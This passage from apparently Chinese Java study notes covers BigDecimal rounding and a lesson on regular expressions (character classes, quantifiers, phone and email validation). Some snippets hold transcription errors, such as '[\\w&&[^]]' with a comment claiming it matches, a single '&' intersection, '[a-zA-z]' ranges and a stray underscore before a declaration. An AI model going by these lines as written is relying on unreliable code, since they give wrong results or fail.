class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;3&quot;</span>) ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用方法进行b1和b2的除法运算，并且将计算结果在控制台进行输出</span></span><br><span class="line">        System.out.println(b1.divide(b2 , <span class="number">2</span> , RoundingMode.UP));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1 / 3 的准确值是 0.333...</span></span><br><span class="line">        <span class="comment">// 使用UP舍入模式时，总是向上舍入</span></span><br><span class="line">        <span class="comment">// 因此，0.333...保留两位小数后会变成0.34</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>小结</strong>：后期在进行两个数的除法运算的时候，常常使用可以设置取舍模式的divide方法</li>
</ul>
<h4 id="底层存储方式-v2"><a class="header-anchor" href="#底层存储方式-v2">¶</a>底层存储方式</h4>
<ul>
<li>把数据看成字符串，遍历得到里面的每一个字符，把这些字符在ASCII码表上的值，都存储到数组中</li>
</ul>
<h2 id="Day19-API（正则表达式）"><a class="header-anchor" href="#Day19-API（正则表达式）">¶</a>Day19 API（正则表达式）</h2>
<h3 id="学习目标-v4"><a class="header-anchor" href="#学习目标-v4">¶</a>学习目标</h3>
<ul>
<li>能够理解正则表达式的作用</li>
<li>能够使用正则表达式的字符类</li>
<li>能够使用正则表达式的逻辑运算符</li>
<li>能够使用正则表达式的预定义字符类</li>
<li>能够使用正则表达式的限定符</li>
<li>能够使用正则表达式的分组</li>
<li>能够在String的split方法中使用正则表达式</li>
</ul>
<h3 id="正则表达式"><a class="header-anchor" href="#正则表达式">¶</a>正则表达式</h3>
<ul>
<li>正则表达式就是用来验证各种字符串的规则。它内部描述了一些规则，可以验证用户输入的字符串是否匹配这个规则</li>
</ul>
<h3 id="体验"><a class="header-anchor" href="#体验">¶</a>体验</h3>
<h4 id="不使用正则表达式验证的例子"><a class="header-anchor" href="#不使用正则表达式验证的例子">¶</a>不使用正则表达式验证的例子</h4>
<ul>
<li>下面的程序让用户输入一个QQ号码，我们要验证：</li>
<li>QQ号码必须是5–15位长度</li>
<li>必须全部是数字</li>
<li>首位不能为0</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.a08regexdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegexDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 假如现在要求校验一个qq号码是否正确。</span></span><br><span class="line"><span class="comment">            规则:6位及20位之内，日不能在开头，必须全部是数字。</span></span><br><span class="line"><span class="comment">            先使用目前所学知识完成校验需求然后体验一下正则表达式检验。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">qq</span> <span class="operator">=</span><span class="string">&quot;1234567890&quot;</span>;</span><br><span class="line">        System.out.println(checkQQ(qq));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用正则表达式</span></span><br><span class="line">        System.out.println(qq.matches(<span class="string">&quot;[1-9]\\d&#123;5,19&#125;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不使用正则表达式</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkQQ</span><span class="params">(String qq)</span> &#123;</span><br><span class="line">        <span class="comment">//规则:6位及20位之内，0不能在开头，必须全部是数字 。</span></span><br><span class="line">        <span class="comment">//核心思想:</span></span><br><span class="line">            <span class="comment">//先把异常数据进行过滤</span></span><br><span class="line">            <span class="comment">//下面的就是满足要求的数据了。</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> qq.length();</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">6</span> || len &gt; <span class="number">20</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//0不能在开头</span></span><br><span class="line">        <span class="keyword">if</span> (qq.startsWith(<span class="string">&quot;0&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//必须全部是数字</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; qq.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> qq.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (c &lt; <span class="string">&#x27;0&#x27;</span> | c &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用正则表达式验证"><a class="header-anchor" href="#使用正则表达式验证">¶</a>使用正则表达式验证</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">qq</span> <span class="operator">=</span><span class="string">&quot;1234567890&quot;</span>;</span><br><span class="line">        System.out.println(qq.matches(<span class="string">&quot;[1-9]\\d&#123;5,19&#125;&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="正则表达式-字符类"><a class="header-anchor" href="#正则表达式-字符类">¶</a>正则表达式-字符类</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 语法示例</span></span><br><span class="line">[abc]：代表a或者b，或者c字符中的一个。</span><br><span class="line">[^abc]：代表除a,b,c以外的任何字符。</span><br><span class="line">[a-z]：代表a-z的所有小写字符中的一个。</span><br><span class="line">[A-Z]：代表A-Z的所有大写字符中的一个。</span><br><span class="line">[<span class="number">0</span>-<span class="number">9</span>]：代表<span class="number">0</span>-<span class="number">9</span>之间的某一个数字字符。</span><br><span class="line">[a-zA-Z0-<span class="number">9</span>]：代表a-z或者A-Z或者<span class="number">0</span>-<span class="number">9</span>之间的任意一个字符。</span><br><span class="line">[a-dm-p]：a 到 d 或 m 到 p之间的任意一个字符。 </span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.a08regexdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegexDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//public boolean matches(String regex):判断是否与正则表达式匹配，匹配返回true</span></span><br><span class="line">        <span class="comment">// 只能是a b c</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------1-------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a&quot;</span>.matches(<span class="string">&quot;[abc]&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;z&quot;</span>.matches(<span class="string">&quot;[abc]&quot;</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不能出现a b c</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------2-------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a&quot;</span>.matches(<span class="string">&quot;[^abc]&quot;</span>)); <span class="comment">// false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;z&quot;</span>.matches(<span class="string">&quot;[^abc]&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;zz&quot;</span>.matches(<span class="string">&quot;[^abc]&quot;</span>)); <span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;zz&quot;</span>.matches(<span class="string">&quot;[^abc][^abc]&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// a到zA到Z(包括头尾的范围)</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------3-------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a&quot;</span>.matches(<span class="string">&quot;[a-zA-z]&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;z&quot;</span>.matches(<span class="string">&quot;[a-zA-z]&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;aa&quot;</span>.matches(<span class="string">&quot;[a-zA-z]&quot;</span>));<span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;zz&quot;</span>.matches(<span class="string">&quot;[a-zA-Z]&quot;</span>)); <span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;zz&quot;</span>.matches(<span class="string">&quot;[a-zA-Z][a-zA-Z]&quot;</span>)); <span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;0&quot;</span>.matches(<span class="string">&quot;[a-zA-Z]&quot;</span>));<span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;0&quot;</span>.matches(<span class="string">&quot;[a-zA-Z0-9]&quot;</span>));<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// [a-d[m-p]] a到d，或m到p</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------4-------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a&quot;</span>.matches(<span class="string">&quot;[a-d[m-p]]&quot;</span>));<span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;d&quot;</span>.matches(<span class="string">&quot;[a-d[m-p]]&quot;</span>)); <span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;m&quot;</span>.matches(<span class="string">&quot;[a-d[m-p]]&quot;</span>)); <span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;p&quot;</span>.matches(<span class="string">&quot;[a-d[m-p]]&quot;</span>)); <span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;e&quot;</span>.matches(<span class="string">&quot;[a-d[m-p]]&quot;</span>)); <span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;0&quot;</span>.matches(<span class="string">&quot;[a-d[m-p]]&quot;</span>)); <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// [a-z&amp;&amp;[def]] a-z和def的交集。为:d，e，f</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------5------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a&quot;</span>.matches(<span class="string">&quot;[a-z&amp;[def]]&quot;</span>)); <span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;d&quot;</span>.matches(<span class="string">&quot;[a-z&amp;&amp;[def]]&quot;</span>)); <span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;0&quot;</span>.matches(<span class="string">&quot;[a-z&amp;&amp;[def]]&quot;</span>)); <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// [a-z&amp;&amp;[^bc]] a-z和非bc的交集。(等同于[ad-z])</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------6------------_&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a&quot;</span>.matches(<span class="string">&quot;[a-z&amp;&amp;[^bc]]&quot;</span>));<span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;b&quot;</span>.matches(<span class="string">&quot;[a-z&amp;&amp;[^bc]]&quot;</span>)); <span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;0&quot;</span>.matches(<span class="string">&quot;[a-z&amp;&amp;[^bc]]&quot;</span>)); <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// [a-z&amp;&amp;[^m-p]] a到z和除了m到p的交集。(等同于[a-lq-z])</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------7-------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;a&quot;</span>.matches(<span class="string">&quot;[a-z&amp;&amp;[^m-p]]&quot;</span>)); <span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;m&quot;</span>.matches(<span class="string">&quot;[a-z&amp;&amp;[^m-p]]&quot;</span>)); <span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;0&quot;</span>.matches(<span class="string">&quot;[a-z&amp;&amp;[^m-p]]&quot;</span>)); <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="正则表达式-逻辑运算符"><a class="header-anchor" href="#正则表达式-逻辑运算符">¶</a>正则表达式-逻辑运算符</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 语法示例：</span></span><br><span class="line">&amp;&amp;：并且</span><br><span class="line">|    ：或者</span><br><span class="line">\  ：转义字符</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 代码示例</span></span><br><span class="line"><span class="comment">// |和&amp;&amp;的使用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;had&quot;</span>;</span><br><span class="line">    <span class="comment">//1.要求字符串是小写辅音字符开头，后跟ad</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;[a-z&amp;&amp;[^aeiou]]ad&quot;</span>;</span><br><span class="line">    System.out.println(<span class="string">&quot;1.&quot;</span> + str.matches(regex));</span><br><span class="line">    <span class="comment">//2.要求字符串是aeiou中的某个字符开头，后跟ad</span></span><br><span class="line">    regex = <span class="string">&quot;[a|e|i|o|u]ad&quot;</span>;<span class="comment">//这种写法相当于：regex = &quot;[aeiou]ad&quot;;</span></span><br><span class="line">    System.out.println(<span class="string">&quot;2.&quot;</span> + str.matches(regex));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 代码示例</span></span><br><span class="line"><span class="comment">// 转义字符\</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.itheima.a08regexdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegexDemo3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// \ 转义字符 改变后面那个字符原本的含义</span></span><br><span class="line">        <span class="comment">//练习:以字符串的形式打印一个双引号</span></span><br><span class="line">        <span class="comment">//&quot;在Java中表示字符串的开头或者结尾</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//此时\表示转义字符，改变了后面那个双引号原本的含义</span></span><br><span class="line">        <span class="comment">//把他变成了一个普普通通的双引号而已。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// \表示转义字符</span></span><br><span class="line">        <span class="comment">//两个\的理解方式：前面的\是一个转义字符，改变了后面\原本的含义，把他变成一个普普通通的\而已。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;c:Users\\moon\\IdeaProjects\\basic-code\\myapi\\src\\com\\itheima\\a08regexdemo\\RegexDemo1.java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="正则表达式-预定义字符"><a class="header-anchor" href="#正则表达式-预定义字符">¶</a>正则表达式-预定义字符</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 语法示例：</span></span><br><span class="line"><span class="string">&quot;.&quot;</span> ： 匹配任何字符。</span><br><span class="line"><span class="string">&quot;\d&quot;</span>：任何数字[<span class="number">0</span>-<span class="number">9</span>]的简写；</span><br><span class="line"><span class="string">&quot;\D&quot;</span>：任何非数字[^<span class="number">0</span>-<span class="number">9</span>]的简写；</span><br><span class="line"><span class="string">&quot;\s&quot;</span>： 空白字符：[ \t\n\x0B\f\r] 的简写</span><br><span class="line"><span class="string">&quot;\S&quot;</span>： 非空白字符：[^\s] 的简写</span><br><span class="line"><span class="string">&quot;\w&quot;</span>：单词字符：[a-zA-Z_0-<span class="number">9</span>]的简写</span><br><span class="line"><span class="string">&quot;\W&quot;</span>：非单词字符：[^\w]</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//.表示任意一个字符</span></span><br><span class="line">        System.out.println(<span class="string">&quot;你&quot;</span>.matches(<span class="string">&quot;..&quot;</span>)); <span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;你&quot;</span>.matches(<span class="string">&quot;.&quot;</span>)); <span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;你a&quot;</span>.matches(<span class="string">&quot;..&quot;</span>));<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// \\d 表示任意的一个数字</span></span><br><span class="line">        <span class="comment">// \\d只能是任意的一位数字</span></span><br><span class="line">        <span class="comment">// 简单来记:两个\表示一个\</span></span><br><span class="line">        System.out.println(<span class="string">&quot;a&quot;</span>.matches(<span class="string">&quot;\\d&quot;</span>)); <span class="comment">// false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;3&quot;</span>.matches(<span class="string">&quot;\\d&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;333&quot;</span>.matches(<span class="string">&quot;\\d&quot;</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//\\w只能是一位单词字符[a-zA-Z_0-9]</span></span><br><span class="line">        System.out.println(<span class="string">&quot;z&quot;</span>.matches(<span class="string">&quot;\\w&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;2&quot;</span>.matches(<span class="string">&quot;\\w&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;21&quot;</span>.matches(<span class="string">&quot;\\w&quot;</span>)); <span class="comment">// false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;你&quot;</span>.matches(<span class="string">&quot;\\w&quot;</span>));<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非单词字符</span></span><br><span class="line">        System.out.println(<span class="string">&quot;你&quot;</span>.matches(<span class="string">&quot;\\W&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------&quot;</span>);</span><br><span class="line">        <span class="comment">// 以上正则匹配只能校验单个字符。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 必须是数字 字母 下划线 至少 6位</span></span><br><span class="line">        System.out.println(<span class="string">&quot;2442fsfsf&quot;</span>.matches(<span class="string">&quot;\\w&#123;6,&#125;&quot;</span>));<span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;244f&quot;</span>.matches(<span class="string">&quot;\\w&#123;6,&#125;&quot;</span>));<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 必须是数字和字符 必须是4位</span></span><br><span class="line">        System.out.println(<span class="string">&quot;23dF&quot;</span>.matches(<span class="string">&quot;[a-zA-Z0-9]&#123;4&#125;&quot;</span>));<span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;23 F&quot;</span>.matches(<span class="string">&quot;[a-zA-Z0-9]&#123;4&#125;&quot;</span>));<span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;23dF&quot;</span>.matches(<span class="string">&quot;[\\w&amp;&amp;[^]]&#123;4&#125;&quot;</span>));<span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;23_F&quot;</span>.matches(<span class="string">&quot;[\\w&amp;&amp;[^_]]&#123;4&#125;&quot;</span>));<span class="comment">//false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="正则表达式-数量词"><a class="header-anchor" href="#正则表达式-数量词">¶</a>正则表达式-数量词</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 语法示例：</span></span><br><span class="line">X? : <span class="number">0</span>次或<span class="number">1</span>次</span><br><span class="line">X* : <span class="number">0</span>次到多次</span><br><span class="line">X+ : <span class="number">1</span>次或多次</span><br><span class="line">X&#123;n&#125; : 恰好n次</span><br><span class="line">X&#123;n,&#125; : 至少n次</span><br><span class="line">X&#123;n,m&#125;: n到m次(n和m都是包含的)</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">     <span class="comment">// 必须是数字 字母 下划线 至少 6位</span></span><br><span class="line">        System.out.println(<span class="string">&quot;2442fsfsf&quot;</span>.matches(<span class="string">&quot;\\w&#123;6,&#125;&quot;</span>));<span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;244f&quot;</span>.matches(<span class="string">&quot;\\w&#123;6,&#125;&quot;</span>));<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 必须是数字和字符 必须是4位</span></span><br><span class="line">        System.out.println(<span class="string">&quot;23dF&quot;</span>.matches(<span class="string">&quot;[a-zA-Z0-9]&#123;4&#125;&quot;</span>));<span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;23 F&quot;</span>.matches(<span class="string">&quot;[a-zA-Z0-9]&#123;4&#125;&quot;</span>));<span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;23dF&quot;</span>.matches(<span class="string">&quot;[\\w&amp;&amp;[^]]&#123;4&#125;&quot;</span>));<span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;23_F&quot;</span>.matches(<span class="string">&quot;[\\w&amp;&amp;[^_]]&#123;4&#125;&quot;</span>));<span class="comment">//false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="正则表达式练习1"><a class="header-anchor" href="#正则表达式练习1">¶</a>正则表达式练习1</h3>
<ul>
<li><strong>需求：</strong>
<ul>
<li>请编写正则表达式验证用户输入的手机号码是否满足要求。</li>
<li>请编写正则表达式验证用户输入的邮箱号是否满足要求。</li>
<li>请编写正则表达式验证用户输入的电话号码是否满足要求。</li>
<li>验证手机号码 13112345678 13712345667 13945679027 139456790271</li>
<li>验证座机电话号码 020-2324242 02122442 027-42424 0712-3242434</li>
<li>验证邮箱号码 <a href="mailto:3232323@qq.com">3232323@qq.com</a> <a href="mailto:zhangsan@itcast.cn">zhangsan@itcast.cn</a>n <a href="mailto:dlei0009@163.com">dlei0009@163.com</a> <a href="mailto:dlei0009@pci.com.cn">dlei0009@pci.com.cn</a></li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.a08regexdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegexDemo4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            需求</span></span><br><span class="line"><span class="comment">            请编写正则表达式验证用户输入的手机号码是否满足要求。请编写正则表达式验证用户输入的邮箱号是否满足要求。请编写正则表达式验证用户输入的电话号码是否满足要求。</span></span><br><span class="line"><span class="comment">            验证手机号码 13112345678 13712345667 13945679027 139456790271</span></span><br><span class="line"><span class="comment">            验证座机电话号码 020-2324242 02122442 027-42424 0712-3242434</span></span><br><span class="line"><span class="comment">            验证邮箱号码 3232323@qq.com zhangsan@itcast.cnn dlei0009@163.com dlei0009@pci.com.cn</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//心得:</span></span><br><span class="line">        <span class="comment">//拿着一个正确的数据，从左到右依次去写。</span></span><br><span class="line">        <span class="comment">//13112345678</span></span><br><span class="line">        <span class="comment">//分成三部分:</span></span><br><span class="line">        <span class="comment">//第一部分:1 表示手机号码只能以1开头</span></span><br><span class="line">        <span class="comment">//第二部分:[3-9] 表示手机号码第二位只能是3-9之间的</span></span><br><span class="line">        <span class="comment">//第三部分:\\d&#123;9&#125; 表示任意数字可以出现9次，也只能出现9次</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex1</span> <span class="operator">=</span> <span class="string">&quot;1[3-9]\\d&#123;9&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;13112345678&quot;</span>.matches(regex1));<span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;13712345667&quot;</span>.matches(regex1));<span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;13945679027&quot;</span>.matches(regex1));<span class="comment">//true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;139456790271&quot;</span>.matches(regex1));<span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//座机电话号码</span></span><br><span class="line">        <span class="comment">//020-2324242 02122442 027-42424 0712-3242434</span></span><br><span class="line">        <span class="comment">//思路:</span></span><br><span class="line">        <span class="comment">//在书写座机号正则的时候需要把正确的数据分为三部分</span></span><br><span class="line">        <span class="comment">//一:区号@\\d&#123;2,3&#125;</span></span><br><span class="line">        <span class="comment">//      0:表示区号一定是以0开头的</span></span><br><span class="line">        <span class="comment">//      \\d&#123;2,3&#125;:表示区号从第二位开始可以是任意的数字，可以出现2到3次。</span></span><br><span class="line">        <span class="comment">//二:- ?表示次数，0次或1次</span></span><br><span class="line">        <span class="comment">//三:号码 号码的第一位也不能以0开头，从第二位开始可以是任意的数字，号码的总长度:5-10位</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">regex2</span> <span class="operator">=</span> <span class="string">&quot;0\\d&#123;2,3&#125;-?[1-9]\\d&#123;4,9&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;020-2324242&quot;</span>.matches(regex2));</span><br><span class="line">        System.out.println(<span class="string">&quot;02122442&quot;</span>.matches(regex2));</span><br><span class="line">        System.out.println(<span class="string">&quot;027-42424&quot;</span>.matches(regex2));</span><br><span class="line">        System.out.println(<span class="string">&quot;0712-3242434&quot;</span>.matches(regex2));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//邮箱号码</span></span><br><span class="line">        <span class="comment">//3232323@qq.com zhangsan@itcast.cnn dlei0009@163.com dlei0009@pci.com.cn</span></span><br><span class="line">        <span class="comment">//思路:</span></span><br><span class="line">        <span class="comment">//在书写邮箱号码正则的时候需要把正确的数据分为三部分</span></span><br><span class="line">        <span class="comment">//第一部分:@的左边 \\w+</span></span><br><span class="line">        <span class="comment">//      任意的字母数字下划线，至少出现一次就可以了</span></span><br><span class="line">        <span class="comment">//第二部分:@ 只能出现一次</span></span><br><span class="line">        <span class="comment">//第三部分:</span></span><br><span class="line">        <span class="comment">//      3.1         .的左边[\\w&amp;&amp;[^]]&#123;2,6&#125;</span></span><br><span class="line">        <span class="comment">//                  任意的字母加数字，总共出现2-6次(此时不能出现下划线)</span></span><br><span class="line">        <span class="comment">//      3.2         . \\.</span></span><br><span class="line">        <span class="comment">//      3.3         大写字母，小写字母都可以，只能出现2-3次[a-zA-Z]&#123;2,3&#125;</span></span><br><span class="line">        <span class="comment">//      我们可以把3.2和3.3看成一组，这一组可以出现1次或者两次</span></span><br><span class="line">_        <span class="type">String</span> <span class="variable">regex3</span> <span class="operator">=</span> <span class="string">&quot;\\w+@[\\w&amp;&amp;[^_]]&#123;2,6&#125;(\\.[a-zA-Z]&#123;2,3&#125;)&#123;1,2&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;3232323@qq.com&quot;</span>.matches(regex3));</span><br><span class="line">        System.out.println(<span class="string">&quot;zhangsan@itcast.cnn&quot;</span>.matches(regex3));</span><br><span class="line">        System.out.println(<span 